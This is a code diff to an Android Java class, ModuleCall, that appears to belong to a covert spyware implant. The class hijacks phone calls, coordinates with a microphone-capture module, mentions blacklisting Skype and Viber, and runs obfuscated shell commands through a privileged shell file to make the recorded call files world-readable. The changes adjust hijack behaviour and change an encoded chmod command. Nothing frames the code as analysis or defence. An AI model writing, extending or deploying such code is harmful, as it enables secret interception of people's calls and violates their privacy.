@@ -165,7 +165,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (installHijack()) {
 					if (ModuleMic.self() != null) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (actualStart) can't register call 'cos mic is on:stopping it");
+							Check.log(TAG + " (actualStart) can't register call because mic is on:stopping it");
 						}
 						ModuleMic.self().stop();
 					}
@@ -207,9 +207,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 			}
 
-
 		}
-
 		return false;
 
 	}
@@ -295,7 +293,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Initialize the callback system
 
 		if (ModuleMic.self() != null) {
-			ModuleMic.self().suspend();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installHijack), Cannot start, because Mic is running");
+			}
+			return false;
+			//ModuleMic.self().suspend();
 			// ModuleMic.self().addBlacklist("skype");
 			// ModuleMic.self().addBlacklist("viber");
 		}
@@ -352,7 +354,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 				// Make it read-write
 
-				Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + fullName);
+				Execute.execute(Configuration.shellFile + " " + M.e("qzx chmod 666 ") + fullName);
 
 				storedFile.delete();
 			}
@@ -402,7 +404,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		hjcb.trigger(s);
 
 		// Make it read-write in any case
-		Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + s);
+		Execute.execute(Configuration.shellFile + " " + M.e("qzx chmod 666 ") + s);
 
 		// Add the file to the list
 		calls.add(s);
